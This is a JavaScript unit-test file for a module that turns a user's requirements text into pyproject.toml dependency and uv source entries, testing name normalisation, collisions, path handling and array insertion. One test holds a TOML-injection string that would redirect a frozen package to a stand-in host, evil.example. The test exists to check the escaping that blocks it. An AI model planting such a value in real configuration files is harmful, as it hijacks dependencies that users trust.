// node --test tests/unit/requirements.test.mjs
//
// This is the field where free user text reaches a generated file, so the tests
// that matter most are the ones about the file's structure rather than about
// parsing convenience. A line that can close the dependencies array and open a
// [tool.uv.sources] table of its own could redirect a frozen package, which is
// the one outcome nothing else would catch.

import { strict as assert } from "node:assert";
import { test } from "node:test";

import {
  findProblems,
  insertDependencies,
  localSourceProblem,
  normalizeName,
  parseRequirements,
  editableBuildFlags,
  renderRequirements,
  tomlString,
} from "../../src/requirements.js";

const DECLARED = ["ocp_vscode", "ipykernel", "build123d", "basedpyright"];

test("a PyPI requirement, with or without a range", () => {
  const [plain, ranged] = parseRequirements("ocp-widgets\nocp-widgets-extra>=0.3,<1.0");
  assert.equal(plain.name, "ocp-widgets");
  assert.equal(plain.requirement, "ocp-widgets");
  assert.equal(plain.source, null);
  assert.equal(ranged.name, "ocp-widgets-extra");
  assert.equal(ranged.requirement, "ocp-widgets-extra>=0.3,<1.0");
  assert.equal(ranged.source, null);
});

test("a local path becomes a named dependency plus a path source", () => {
  const [entry] = parseRequirements("/Users/bernhard/Development/CAD/mylib");
  assert.equal(entry.name, "mylib");
  assert.equal(entry.requirement, "mylib");
  assert.deepEqual(entry.source, {
    path: "/Users/bernhard/Development/CAD/mylib",
    editable: true,
  });
});

test("a Windows path is recognised as a path, not a requirement", () => {
  const [entry] = parseRequirements("C:\\Users\\bernhard\\src\\mylib");
  assert.equal(entry.name, "mylib");
  assert.deepEqual(entry.source, {
    path: "C:\\Users\\bernhard\\src\\mylib",
    editable: true,
  });
});

test("a git URL becomes a named dependency plus a git source", () => {
  const [entry] = parseRequirements("git+https://github.com/someone/mylib");
  assert.equal(entry.name, "mylib");
  assert.deepEqual(entry.source, { git: "git+https://github.com/someone/mylib" });
});

test("a git URL with a ref splits the ref out", () => {
  const [entry] = parseRequirements("git+https://github.com/someone/mylib@main");
  assert.equal(entry.name, "mylib");
  assert.deepEqual(entry.source, { git: "git+https://github.com/someone/mylib", rev: "main" });
});

test("a .git suffix is not part of the package name", () => {
  const [entry] = parseRequirements("https://github.com/someone/mylib.git");
  assert.equal(entry.name, "mylib");
});

test("an explicit name wins over the guess, and needs no source entry", () => {
  // The escape hatch for a repository whose distribution is named differently.
  const [entry] = parseRequirements("mylib @ git+https://github.com/someone/python-lib");
  assert.equal(entry.name, "mylib");
  assert.equal(entry.requirement, "mylib @ git+https://github.com/someone/python-lib");
  assert.equal(entry.source, null, "a PEP 508 direct reference is understood as written");
});

test("blank lines and comments are dropped, and line numbers still count them", () => {
  const entries = parseRequirements("\n# a note\n\nmylib\n");
  assert.equal(entries.length, 1);
  assert.equal(entries[0].line, 4, "so an error message points at the right line");
});

test("a line with no usable name is reported rather than thrown on", () => {
  const [entry] = parseRequirements("!!!");
  assert.equal(entry.name, null);
  assert.notEqual(entry.error, null);
});

// --- the collision rules ---------------------------------------------------

test("a package the application declares is refused", () => {
  const problems = findProblems(parseRequirements("build123d>=0.12"), DECLARED);
  assert.equal(problems.length, 1);
  assert.match(problems[0], /build123d is already part of the application/);
});

test("collision is by normalised name, so separators do not evade it", () => {
  // uv treats these as one package, so the rule has to as well.
  for (const spelling of ["ocp_vscode", "ocp-vscode", "OCP.VSCode", "OCP_VSCODE"]) {
    const problems = findProblems(parseRequirements(`${spelling}==5.0`), DECLARED);
    assert.equal(problems.length, 1, `${spelling} must be recognised as ocp_vscode`);
  }
});

test("a local path colliding with a declared package is refused too", () => {
  // The form that looks least like a collision and is one.
  const problems = findProblems(parseRequirements("/Users/me/src/build123d"), DECLARED);
  assert.equal(problems.length, 1);
  assert.match(problems[0], /already part of the application/);
});

test("the same package given twice is refused, naming the earlier line", () => {
  // my_lib and my-lib are one package under PEP 503; mylib is a different one,
  // because normalisation collapses separators but does not remove them.
  const problems = findProblems(parseRequirements("my_lib==1.0\nmylib\nmy-lib==2.0"), DECLARED);
  assert.equal(problems.length, 1, "only the third line is a duplicate");
  assert.match(problems[0], /Line 3/);
  assert.match(problems[0], /line 1/);
});

test("a package that is only a transitive dependency is allowed", () => {
  // One this application does not declare: constraining it is the user's
  // business, and uv enforces the parent's range on top of whatever they write.
  assert.deepEqual(findProblems(parseRequirements("some-transitive>3.4.0,<3.5"), DECLARED), []);
});

test("nothing wrong means nothing reported", () => {
  assert.deepEqual(findProblems(parseRequirements("a\nb>=1\n/tmp/c"), DECLARED), []);
});

// --- the file's structure --------------------------------------------------

test("a quote cannot escape the string it is written into", () => {
  // The attack this whole module exists to prevent: close the string, close the
  // array, open a table, redirect a frozen package.
  const hostile = 'x", ]\n[tool.uv.sources]\nocp_vscode = { git = "https://evil.example/x" }\n#';
  const rendered = tomlString(hostile);

  // TOML basic strings and JSON strings escape these the same way, so a
  // successful round-trip is the property worth asserting: had any quote ended
  // the string early, what came back would not be what went in.
  assert.equal(JSON.parse(rendered), hostile);
  assert.equal(rendered.includes("\n"), false, "no bare newline survives");
});

test("a backslash is escaped, so a Windows path cannot end the string", () => {
  // "C:\src\mylib\" would otherwise escape the closing quote.
  const rendered = tomlString("C:\\src\\mylib\\");
  assert.equal(rendered, '"C:\\\\src\\\\mylib\\\\"');
});

test("rendering produces dependency lines and source entries", () => {
  const entries = parseRequirements(
    ["ocp-widgets>=0.3", "/Users/me/src/mylib", "git+https://github.com/someone/other@main"].join("\n"),
  );
  const { dependencies, sources } = renderRequirements(entries);
  assert.deepEqual(dependencies, [
    '    "ocp-widgets>=0.3",',
    '    "mylib",',
    '    "other",',
  ]);
  assert.deepEqual(sources, [
    'mylib = { path = "/Users/me/src/mylib", editable = true }',
    'other = { git = "git+https://github.com/someone/other", rev = "main" }',
  ]);
});

test("an unusable line contributes nothing to the file", () => {
  const { dependencies, sources } = renderRequirements(parseRequirements("!!!\nmylib"));
  assert.deepEqual(dependencies, ['    "mylib",']);
  assert.deepEqual(sources, []);
});

// --- where the lines go --------------------------------------------------

// The shipped file, shortened but with the shape that matters: a `[tool.uv]`
// table *after* the dependencies array, so the array's `]` is not the last one.
const PYPROJECT = `[project]
name = "build123d-studio-runtime"
requires-python = "==3.14.*"

dependencies = [
    # --- frozen: moves only when the application is rebuilt and retested ---
    "ocp_vscode==4.0.1",
    "pywinpty==3.0.5; sys_platform == 'win32'",

    # --- floating: moved by "Upgrade packages", within this range ---
    "build123d>=0.11.1",
]

# This project exists only to pin an environment - there is no package to build.
[tool.uv]
package = false
`;

test("lines land inside the dependencies array, not in [tool.uv]", () => {
  // The bug this replaces: inserting at the file's last "]" put the packages
  // inside `[tool.uv`, and uv refused to parse the file at all.
  const out = insertDependencies(PYPROJECT, ['    "mylib",']);
  assert.match(out, /"build123d>=0\.11\.1",\n {4}"mylib",\n\]/);
  assert.match(out, /\n\[tool\.uv\]\npackage = false\n$/, "[tool.uv] must be intact");
});

test("a bracket inside a string does not end the array early", () => {
  const tricky = 'dependencies = [\n    "a; extra == \'x]\'",\n]\n\n[tool.uv]\n';
  const out = insertDependencies(tricky, ['    "mylib",']);
  assert.match(out, /"a; extra == 'x\]'",\n {4}"mylib",\n\]/);
});

test("a bracket inside a comment does not end the array early", () => {
  const tricky = 'dependencies = [\n    # a ] in a comment\n    "a",\n]\n\n[tool.uv]\n';
  const out = insertDependencies(tricky, ['    "mylib",']);
  assert.match(out, /"a",\n {4}"mylib",\n\]/);
});

test("nothing to insert leaves the file untouched", () => {
  assert.equal(insertDependencies(PYPROJECT, []), PYPROJECT);
});

test("a file with no dependencies array is refused rather than mangled", () => {
  // The caller has to treat null as "do not write", because writing a file we
  // could not understand is how the array ended up inside [tool.uv].
  assert.equal(insertDependencies("[project]\nname = \"x\"\n", ['    "mylib",']), null);
  assert.equal(insertDependencies("dependencies = [\n    \"a\",\n", ['    "x",']), null);
});

test("normalizeName follows PEP 503", () => {
  assert.equal(normalizeName("OCP_Tessellate"), "ocp-tessellate");
  assert.equal(normalizeName("a.._-.b"), "a-b");
});

test("a relative path is refused, because nothing here is relative to anything", () => {
  // uv resolves it against the project root, which is the environment under the
  // app-data directory. The dangerous case is not the one that fails - it is
  // "../../src/mylib" resolving to a directory that happens to exist.
  for (const path of ["./mylib", "../mylib", "../../Development/CAD/bd_warehouse", "~/src/mylib"]) {
    const [entry] = parseRequirements(path);
    assert.notEqual(entry.error, null, `${path} must be refused`);
    assert.match(entry.error, /full path/);
  }
});

test("an absolute path is still fine, on both platforms", () => {
  for (const path of ["/Users/me/src/mylib", "C:\\Users\\me\\src\\mylib"]) {
    const [entry] = parseRequirements(path);
    assert.equal(entry.error, null, `${path} must be accepted`);
    assert.equal(entry.source.editable, true);
  }
});

test("a refused path contributes nothing to the file", () => {
  const { dependencies, sources } = renderRequirements(parseRequirements("../mylib\n/tmp/other"));
  assert.deepEqual(dependencies, ['    "other",']);
  assert.deepEqual(sources, ['other = { path = "/tmp/other", editable = true }']);
});

test("editable is written as a TOML boolean, not a string", () => {
  // `editable = "true"` is a string and uv rejects it.
  const { sources } = renderRequirements(parseRequirements("/tmp/mylib"));
  assert.match(sources[0], /editable = true\b/);
  assert.equal(sources[0].includes('"true"'), false);
});

// The source picker, not this field - but the same definition of "absolute
// enough", which is why the rule lives beside `relative` and `looksLikePath`.

test("choosing a local checkout without a folder is refused", () => {
  // The case that reached a real build: pick "Local checkout", press Apply, and
  // the stored choice installs from PyPI, because renderPyproject drops a
  // source it has no path for.
  for (const empty of ["", "   "]) {
    const problem = localSourceProblem("build123d", empty);
    assert.notEqual(problem, null);
    assert.match(problem, /choose a folder/);
  }
});

test("a chosen folder is accepted on both platforms", () => {
  for (const path of ["/Users/me/src/build123d", "C:\\src\\build123d", "  /tmp/b  "]) {
    assert.equal(localSourceProblem("build123d", path), null, `${path} must be accepted`);
  }
});

test("a relative folder is refused, as it is in the requirements field", () => {
  // uv resolves it against the environment root under the app-data directory,
  // so the dangerous case is not the one that fails - it is the one that finds
  // a different directory of the same name.
  for (const path of ["../build123d", "./build123d", "~/src/build123d", "src/build123d"]) {
    const problem = localSourceProblem("build123d", path);
    assert.notEqual(problem, null, `${path} must be refused`);
    assert.match(problem, /full path/);
  }
});

test("the message names the package, because a row is per package", () => {
  assert.match(localSourceProblem("bd_warehouse", ""), /^bd_warehouse:/);
});

// What the editor can see of a local checkout.
//
// setuptools picks its editable layout by project shape: a src-layout checkout
// gets a .pth holding one directory, a flat-layout one gets an import hook whose
// module-to-directory mapping exists only while Python is running. basedpyright
// reads .pth files and executes nothing, so the second kind imports perfectly in
// the kernel and is underlined as unresolved in the editor - which reads as the
// editor being broken about correct code.
//
// Measured on a flat-layout checkout with uv 0.12.1: without the setting, a
// `__editable___..._finder.py` and an unresolved import; with it, a .pth holding
// the repository root. On a src-layout checkout the .pth is identical either
// way, so the ordinary case pays nothing.

test("a local checkout is installed in the layout an analyser can follow", () => {
  const { editables } = renderRequirements(parseRequirements("/Users/me/src/mylib"));
  assert.deepEqual(editables, ["mylib"]);
  assert.deepEqual(editableBuildFlags(editables), [
    "--config-settings-package",
    "mylib:editable_mode=compat",
  ]);
});

test("nothing else asks for it", () => {
  // PyPI and git are not checkouts, so there is nothing for setuptools to lay
  // out and no reason to send a build backend a setting it did not ask for.
  const { editables } = renderRequirements(
    parseRequirements("matplotlib>=3.8\ngit+https://github.com/someone/mylib"),
  );
  assert.deepEqual(editables, []);
  assert.deepEqual(editableBuildFlags(editables), []);
});

test("each checkout is named on its own, because the setting is per package", () => {
  // `-C editable_mode=compat` without a package would send a setuptools setting
  // to every backend in the resolution, including the ones building wheels for
  // packages nobody here chose.
  assert.deepEqual(editableBuildFlags(["build123d", "cadquery"]), [
    "--config-settings-package",
    "build123d:editable_mode=compat",
    "--config-settings-package",
    "cadquery:editable_mode=compat",
  ]);
});
